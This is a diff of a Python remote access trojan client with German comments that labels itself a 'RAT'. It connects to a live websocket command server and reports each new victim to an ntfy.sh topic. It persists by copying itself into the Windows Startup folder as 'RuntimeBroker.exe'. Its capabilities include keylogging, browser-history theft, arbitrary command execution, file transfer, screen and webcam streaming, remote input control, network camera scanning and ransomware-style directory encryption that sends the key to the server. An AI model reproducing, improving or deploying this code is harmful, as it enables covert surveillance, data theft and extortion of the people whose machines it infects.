@@ -23,20 +23,22 @@ from cryptography.hazmat.backends import default_backend
 import tempfile
 import threading
 
-# pynput wird für den Keylogger benötigt
+# --- Konfiguration & Globals ---
+SERVER_URI = "wss://yawning-chameleon-norobb-e4dabbb0.koyeb.app:443/rat"
+KEYLOG_FILE_PATH = os.path.join(os.path.expanduser("~"), ".klog.dat")
+NTFY_TOPIC = "RAT_JundN"
+CHUNKED_UPLOADS = {}
+
+logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
+
+# --- Optionales Modul: Keylogger ---
 try:
     from pynput import keyboard
 except ImportError:
     print("[!] pynput ist nicht installiert. Keylogger-Funktion nicht verfügbar.")
     keyboard = None
 
-SERVER_URI = "wss://yawning-chameleon-norobb-e4dabbb0.koyeb.app:443/rat"
-KEYLOG_FILE_PATH = os.path.join(os.path.expanduser("~"), ".klog.dat")
-NTFY_TOPIC = "RAT_JundN"
-
-logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
-
-# --- Systeminformationsfunktionen ---
+# === Hilfsfunktionen: System & Netzwerk ===
 def get_public_ip():
     try:
         with urllib.request.urlopen('https://api.ipify.org', timeout=5) as resp:
@@ -53,34 +55,8 @@ def get_local_ips():
         logging.warning(f"Fehler beim Abrufen der lokalen IPs: {e}")
         return "Unbekannt"
 
-def send_ntfy_notification():
-    try:
-        system_info = (
-            f"Neue RAT-Verbindung!\n"
-            f"Benutzer: {os.getlogin()}\n"
-            f"Hostname: {socket.gethostname()}\n"
-            f"OS: {platform.platform()}\n"
-            f"Öffentliche IP: {get_public_ip()}\n"
-            f"Lokale IPs: {get_local_ips()}\n"
-            f"RAT-URL: https://yawning-chameleon-norobb-e4dabbb0.koyeb.app"
-        )
-        
-        req = urllib.request.Request(
-            f"https://ntfy.sh/{NTFY_TOPIC}",
-            data=system_info.encode('utf-8'),
-            headers={
-                "Title": "RAT Aktivierung",
-                "Priority": "urgent",
-                "Tags": "warning,skull"
-            }
-        )
-        urllib.request.urlopen(req, timeout=10)
-    except Exception as e:
-        logging.warning(f"Fehler beim Senden der NTFY-Benachrichtigung: {e}")
-
 def get_system_info():
     try:
-        # Windows: os.getlogin() kann in manchen Umgebungen fehlschlagen
         try:
             user = os.getlogin()
         except Exception:
@@ -101,6 +77,54 @@ def get_system_info():
     except Exception as e:
         return f"Fehler beim Abrufen der Systeminformationen: {e}"
 
+def send_ntfy_notification():
+    try:
+        system_info = (
+            f"Neue RAT-Verbindung!\n"
+            f"Benutzer: {os.getlogin()}\n"
+            f"Hostname: {socket.gethostname()}\n"
+            f"OS: {platform.platform()}\n"
+            f"Öffentliche IP: {get_public_ip()}\n"
+            f"Lokale IPs: {get_local_ips()}\n"
+            f"RAT-URL: https://yawning-chameleon-norobb-e4dabbb0.koyeb.app"
+        )
+        req = urllib.request.Request(
+            f"https://ntfy.sh/{NTFY_TOPIC}",
+            data=system_info.encode('utf-8'),
+            headers={
+                "Title": "RAT Aktivierung",
+                "Priority": "urgent",
+                "Tags": "warning,skull"
+            }
+        )
+        urllib.request.urlopen(req, timeout=10)
+    except Exception as e:
+        logging.warning(f"Fehler beim Senden der NTFY-Benachrichtigung: {e}")
+
+def ensure_persistence():
+    if platform.system() != "Windows":
+        return
+    try:
+        startup_filename = "RuntimeBroker.exe"
+        source_path = sys.executable
+        startup_folder = os.path.join(
+            os.environ["APPDATA"],
+            "Microsoft",
+            "Windows",
+            "Start Menu",
+            "Programs",
+            "Startup",
+        )
+        dest_path = os.path.join(startup_folder, startup_filename)
+        if source_path.lower() == dest_path.lower():
+            return
+        if not os.path.exists(dest_path):
+            os.makedirs(startup_folder, exist_ok=True)
+            shutil.copyfile(source_path, dest_path)
+    except Exception as e:
+        logging.warning(f"Fehler bei Persistenz: {e}")
+
+# === Datei- und Verzeichnisfunktionen ===
 def list_directory(path="."):
     try:
         entries = os.listdir(path)
@@ -123,24 +147,78 @@ def save_uploaded_file(filename, data_b64):
     except Exception as e:
         return f"Fehler beim Speichern der Datei: {e}"
 
-def shutdown_or_restart(action):
+def change_directory(path):
     try:
-        if platform.system() == "Windows":
-            if action == "shutdown":
-                os.system("shutdown /s /t 1")
-            elif action == "restart":
-                os.system("shutdown /r /t 1")
-        else:
-            if action == "shutdown":
-                os.system("shutdown now")
-            elif action == "restart":
-                os.system("reboot")
-        return f"System wird {action}..."
+        os.chdir(path)
+        return f"Verzeichnis gewechselt zu: {os.getcwd()}"
     except Exception as e:
-        return f"Fehler beim {action}: {e}"
+        return f"Fehler beim Wechseln des Verzeichnisses: {e}"
 
-# --- Keylogger-Funktionen ---
+# === Verschlüsselung/Entschlüsselung ===
+def encrypt_file(filepath, key):
+    backend = default_backend()
+    iv = secrets.token_bytes(16)
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
+    encryptor = cipher.encryptor()
+    with open(filepath, "rb") as f:
+        data = f.read()
+    padder = padding.PKCS7(128).padder()
+    padded_data = padder.update(data) + padder.finalize()
+    ct = encryptor.update(padded_data) + encryptor.finalize()
+    with open(filepath, "wb") as f:
+        f.write(iv + ct)
+
+def encrypt_directory(path):
+    key = secrets.token_bytes(32)
+    encrypted_files = []
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            try:
+                full_path = os.path.join(root, file)
+                encrypt_file(full_path, key)
+                encrypted_files.append(full_path)
+            except Exception:
+                pass
+    return key, encrypted_files
+
+def decrypt_file(filepath, key):
+    backend = default_backend()
+    with open(filepath, "rb") as f:
+        iv = f.read(16)
+        ct = f.read()
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
+    decryptor = cipher.decryptor()
+    padded_data = decryptor.update(ct) + decryptor.finalize()
+    unpadder = padding.PKCS7(128).unpadder()
+    data = unpadder.update(padded_data) + unpadder.finalize()
+    with open(filepath, "wb") as f:
+        f.write(data)
+
+def decrypt_directory(path, key_hex):
+    key = bytes.fromhex(key_hex)
+    decrypted_files = []
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            try:
+                full_path = os.path.join(root, file)
+                decrypt_file(full_path, key)
+                decrypted_files.append(full_path)
+            except Exception:
+                pass
+    return decrypted_files
+
+async def send_encryption_key(websocket, key, path):
+    msg = {
+        "type": "encryption_key",
+        "key_hex": key.hex(),
+        "path": path
+    }
+    await websocket.send(json.dumps(msg))
+
+# === Keylogger ===
 def on_press_persistent(key):
+    if not keyboard:
+        return
     special_key_map = {
         keyboard.Key.enter: f" [<<<{datetime.now().strftime('%H:%M:%S')}>>>]\n",
         keyboard.Key.space: " ",
@@ -192,31 +270,40 @@ def start_persistent_keylogger():
     listener.start()
     print(f"[+] Persistenter Keylogger gestartet. Log-Datei: {KEYLOG_FILE_PATH}")
 
-# --- Persistenzfunktion ---
-def ensure_persistence():
-    if platform.system() != "Windows":
-        return
+# === Netzwerk-Kamerascan ===
+def scan_network_cameras():
+    import socket
+    found = []
+    ports = [554, 80, 8080, 81]
     try:
-        startup_filename = "RuntimeBroker.exe"
-        source_path = sys.executable
-        startup_folder = os.path.join(
-            os.environ["APPDATA"],
-            "Microsoft",
-            "Windows",
-            "Start Menu",
-            "Programs",
-            "Startup",
-        )
-        dest_path = os.path.join(startup_folder, startup_filename)
-        if source_path.lower() == dest_path.lower():
-            return
-        if not os.path.exists(dest_path):
-            os.makedirs(startup_folder, exist_ok=True)
-            shutil.copyfile(source_path, dest_path)
-    except Exception as e:
-        logging.warning(f"Fehler bei Persistenz: {e}")
+        local_ip = socket.gethostbyname(socket.gethostname())
+        subnet = ".".join(local_ip.split(".")[:3]) + "."
+    except Exception:
+        subnet = "192.168.0."
+    lock = threading.Lock()
+    def check_ip(ip):
+        for port in ports:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(0.5)
+                res = s.connect_ex((ip, port))
+                s.close()
+                if res == 0:
+                    with lock:
+                        found.append(f"{ip}:{port}")
+            except Exception:
+                pass
+    threads = []
+    for i in range(1, 255):
+        ip = subnet + str(i)
+        t = threading.Thread(target=check_ip, args=(ip,))
+        t.start()
+        threads.append(t)
+    for t in threads:
+        t.join(timeout=1.5)
+    return found
 
-# --- Browserverlauf-Funktion (erweitert für mehrere Browser) ---
+# === Browserverlauf ===
 def get_browser_history(limit=50):
     browsers = {
         "Chrome": {
@@ -317,7 +404,7 @@ def get_browser_history(limit=50):
     
     return "\n".join(output) if output else "Keine Browserverläufe gefunden."
 
-# --- Fernsteuerung via pyautogui ---
+# === Fernsteuerung via pyautogui ===
 def handle_pyautogui_control(cmd: dict):
     import pyautogui
     action = cmd.get("control_action")
@@ -352,12 +439,11 @@ def handle_pyautogui_control(cmd: dict):
         elif action == "type":
             text = cmd.get("text", "")
             pyautogui.typewrite(text)
-        # Add more actions as needed
         return {"status": "ok"}
     except Exception as e:
         return {"status": "error", "error": str(e)}
 
-# --- Screen Streaming (VNC-Style) ---
+# === Screen Streaming (VNC-Style) ===
 class ScreenStreamer:
     def __init__(self):
         self._task = None
@@ -388,9 +474,6 @@ class ScreenStreamer:
         print("[ScreenStreamer] Gestoppt.")
 
     async def _stream(self):
-        import mss
-        from PIL import Image
-        import io
         sct = mss.mss()
         monitor = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
         max_width, max_height = 1280, 720
@@ -422,6 +505,7 @@ class ScreenStreamer:
 
 screen_streamer = ScreenStreamer()
 
+# === Webcam Streaming ===
 class WebcamStreamer:
     def __init__(self):
         self._task = None
@@ -476,22 +560,17 @@ class WebcamStreamer:
 
 webcam_streamer = WebcamStreamer()
 
-# --- Hauptlogik ---
-# --- Chunked Upload State ---
-CHUNKED_UPLOADS = {}
-
+# === Hauptlogik: Kommandos ===
 async def process_commands(websocket):
-    # VNC-Style: Screenstream bleibt aktiv, solange gestartet
     while True:
         try:
             message = await websocket.recv()
             if isinstance(message, bytes):
-                continue  # ignore unexpected binary
+                continue
             command = json.loads(message)
             action = command.get("action")
             response = {"status": "ok"}
 
-            # --- Screen Streaming Steuerung ---
             if action == "screenstream_start":
                 print("[Client] Screenstream Start angefordert.")
                 await screen_streamer.start(websocket)
@@ -507,7 +586,6 @@ async def process_commands(websocket):
                 await websocket.send(json.dumps(response))
                 continue
             elif action == "control":
-                # Fernsteuerung via pyautogui
                 ctrl_result = handle_pyautogui_control(command)
                 response.update(ctrl_result)
                 response["type"] = "command_output"
@@ -526,10 +604,9 @@ async def process_commands(websocket):
                 )
                 response["type"] = "command_output"
                 response["output"] = result.stdout + result.stderr
-            
+
             elif action == "screenshot":
                 try:
-                    import tempfile
                     with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tmpfile:
                         tmp_path = tmpfile.name
                     with mss.mss() as sct:
@@ -550,7 +627,7 @@ async def process_commands(websocket):
                         "level": "error",
                         "msg": f"Screenshot-Fehler: {e}"
                     }))
-            
+
             elif action == "download":
                 path = command.get("path")
                 if os.path.exists(path) and os.path.isfile(path):
@@ -562,31 +639,31 @@ async def process_commands(websocket):
                 else:
                     response["status"] = "error"
                     response["error"] = "Datei nicht gefunden oder ist ein Verzeichnis."
-            
+
             elif action == "upload":
                 filename = command.get("filename")
                 data_b64 = command.get("data")
                 response["type"] = "command_output"
                 response["output"] = save_uploaded_file(filename, data_b64)
-            
+
             elif action == "ls":
                 path = command.get("path", ".")
                 response["type"] = "command_output"
                 response["output"] = list_directory(path)
-            
+
             elif action == "systeminfo":
                 response["type"] = "command_output"
                 response["output"] = get_system_info()
-            
+
             elif action in ("shutdown", "restart"):
                 response["type"] = "command_output"
                 response["output"] = shutdown_or_restart(action)
-            
+
             elif action == "history":
-                limit = command.get("limit", 50)  # Standard: 50 Einträge
+                limit = command.get("limit", 50)
                 response["type"] = "command_output"
                 response["output"] = get_browser_history(limit)
-            
+
             elif action == "keylogger":
                 if not keyboard:
                     response["status"] = "error"
@@ -638,7 +715,6 @@ async def process_commands(websocket):
                 data_b64 = command.get("data")
                 original_filename = command.get("original_filename")
                 filesize = command.get("filesize")
-                # Initialisiere temporäre Datei für diesen Upload
                 if file_id not in CHUNKED_UPLOADS:
                     temp_path = tempfile.NamedTemporaryFile(delete=False).name
                     CHUNKED_UPLOADS[file_id] = {
@@ -650,11 +726,9 @@ async def process_commands(websocket):
                         "filesize": filesize,
                     }
                 upload = CHUNKED_UPLOADS[file_id]
-                # Schreibe Chunk an richtige Stelle
                 with open(upload["path"], "ab") as f:
                     f.write(base64.b64decode(data_b64))
                 upload["received"].add(chunk_index)
-                # Wenn alle Chunks da, verschiebe Datei an Ziel
                 if len(upload["received"]) == total_chunks:
                     try:
                         shutil.move(upload["path"], filename)
@@ -665,12 +739,10 @@ async def process_commands(websocket):
                     response = {"type": "command_output", "output": msg}
                     await websocket.send(json.dumps(response))
                 else:
-                    # Optional: Fortschritt melden
                     response = {"type": "debug", "msg": f"Chunk {chunk_index+1}/{total_chunks} empfangen für {filename}"}
                     await websocket.send(json.dumps(response))
                 continue
             elif action == "scan_cameras":
-                # Netzwerk-Kameras suchen
                 cams = scan_network_cameras()
                 response["type"] = "command_output"
                 response["output"] = "Gefundene Netzwerk-Kameras:\n" + ("\n".join(cams) if cams else "Keine gefunden.")
@@ -689,14 +761,13 @@ async def process_commands(websocket):
             else:
                 response["status"] = "error"
                 response["error"] = "Unbekannte Aktion"
-            
+
             await websocket.send(json.dumps(response))
         except Exception as e:
             print(f"[Client] Fehler im Command-Handler: {e}")
             error_response = {"status": "error", "error": f"Client-Fehler: {e}"}
             try:
                 await websocket.send(json.dumps(error_response))
-                # Fehler auch als Log an das Web-UI senden
                 await websocket.send(json.dumps({
                     "type": "client_log",
                     "level": "error",
@@ -705,73 +776,7 @@ async def process_commands(websocket):
             except Exception as e2:
                 print(f"[Client] Fehler beim Senden des Fehler-Responses: {e2}")
 
-def decrypt_file(filepath, key):
-    backend = default_backend()
-    with open(filepath, "rb") as f:
-        iv = f.read(16)
-        ct = f.read()
-    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
-    decryptor = cipher.decryptor()
-    padded_data = decryptor.update(ct) + decryptor.finalize()
-    unpadder = padding.PKCS7(128).unpadder()
-    data = unpadder.update(padded_data) + unpadder.finalize()
-    with open(filepath, "wb") as f:
-        f.write(data)
-
-def decrypt_directory(path, key_hex):
-    key = bytes.fromhex(key_hex)
-    decrypted_files = []
-    for root, dirs, files in os.walk(path):
-        for file in files:
-            try:
-                full_path = os.path.join(root, file)
-                decrypt_file(full_path, key)
-                decrypted_files.append(full_path)
-            except Exception:
-                pass
-    return decrypted_files
-
-def change_directory(path):
-    try:
-        os.chdir(path)
-        return f"Verzeichnis gewechselt zu: {os.getcwd()}"
-    except Exception as e:
-        return f"Fehler beim Wechseln des Verzeichnisses: {e}"
-
-def encrypt_file(filepath, key):
-    backend = default_backend()
-    iv = secrets.token_bytes(16)
-    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
-    encryptor = cipher.encryptor()
-    with open(filepath, "rb") as f:
-        data = f.read()
-    padder = padding.PKCS7(128).padder()
-    padded_data = padder.update(data) + padder.finalize()
-    ct = encryptor.update(padded_data) + encryptor.finalize()
-    with open(filepath, "wb") as f:
-        f.write(iv + ct)
-
-def encrypt_directory(path):
-    key = secrets.token_bytes(32)
-    encrypted_files = []
-    for root, dirs, files in os.walk(path):
-        for file in files:
-            try:
-                full_path = os.path.join(root, file)
-                encrypt_file(full_path, key)
-                encrypted_files.append(full_path)
-            except Exception:
-                pass
-    return key, encrypted_files
-
-async def send_encryption_key(websocket, key, path):
-    msg = {
-        "type": "encryption_key",
-        "key_hex": key.hex(),
-        "path": path
-    }
-    await websocket.send(json.dumps(msg))
-
+# === Haupt-Entry-Point ===
 async def connect_to_server():
     ensure_persistence()
     start_persistent_keylogger()
@@ -780,8 +785,6 @@ async def connect_to_server():
         try:
             async with websockets.connect(SERVER_URI) as websocket:
                 logging.info("[+] Verbunden mit dem Server.")
-
-                # Warte auf systeminfo-Request vom Server
                 try:
                     msg = await websocket.recv()
                     if isinstance(msg, bytes):
@@ -798,7 +801,6 @@ async def connect_to_server():
                         }))
                 except Exception as e:
                     logging.warning(f"Fehler beim Senden von Systeminfos: {e}")
-
                 await process_commands(websocket)
         except (websockets.ConnectionClosed, ConnectionRefusedError) as e:
             logging.warning(f"Verbindung verloren: {e}")
@@ -809,41 +811,3 @@ async def connect_to_server():
 
 if __name__ == "__main__":
     asyncio.run(connect_to_server())
-
-def scan_network_cameras():
-    """
-    Sucht nach IP-Kameras im lokalen Netzwerk (Standardports für RTSP/HTTP).
-    Gibt eine Liste gefundener IPs/URLs zurück.
-    """
-    import socket
-    found = []
-    ports = [554, 80, 8080, 81]
-    try:
-        local_ip = socket.gethostbyname(socket.gethostname())
-        subnet = ".".join(local_ip.split(".")[:3]) + "."
-    except Exception:
-        subnet = "192.168.0."
-    lock = threading.Lock()
-
-    def check_ip(ip):
-        for port in ports:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(0.5)
-                res = s.connect_ex((ip, port))
-                s.close()
-                if res == 0:
-                    with lock:
-                        found.append(f"{ip}:{port}")
-            except Exception:
-                pass
-
-    threads = []
-    for i in range(1, 255):
-        ip = subnet + str(i)
-        t = threading.Thread(target=check_ip, args=(ip,))
-        t.start()
-        threads.append(t)
-    for t in threads:
-        t.join(timeout=1.5)
-    return found
